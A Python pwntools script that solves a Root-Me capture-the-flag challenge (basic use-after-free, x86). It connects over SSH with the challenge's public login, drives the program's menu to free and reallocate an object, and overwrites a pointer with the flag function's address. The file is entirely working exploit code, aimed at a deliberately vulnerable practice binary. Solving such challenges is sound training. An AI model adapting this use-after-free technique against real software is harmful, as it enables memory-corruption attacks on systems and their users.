from pwn import *
from struct import pack, unpack
"""
rootme basic uaf x86
"""
s = ssh(user='app-systeme-ch63',host='challenge03.root-me.org',port=2223,password='app-systeme-ch63')


flag = 0x080487CB

def p32(data) : 
	return pack("<I",data)

def up32(data) : 
	return unpack("<I",data)

p = s.process("./ch63")


print(p.recvuntil("Quit"))
p.send("1\n")
print(p.recvuntil("him?"))
p.send("A"*32+"\n")
print(p.recvuntil("Quit"))

p.send("1\n")
print(p.recvuntil("him?"))
p.send("B"*32+"\n")
print(p.recvuntil("Quit"))

p.send("5\n")
print(p.recvuntil("it?"))
p.send("C"*32+"\n")
print(p.recvuntil("it?"))
p.send("D"*32+"\n")

print(p.recvuntil("Quit"))
p.send("4\n")

p.send("5\n")
print(p.recvuntil("it?"))
p.sendline(p32(flag)*4)
print(p.recvuntil("it?"))
p.send("D"*8+"\n")

print(p.recvuntil("Quit"))
p.send("2\n")
print(p.recvuntil("Quit"))
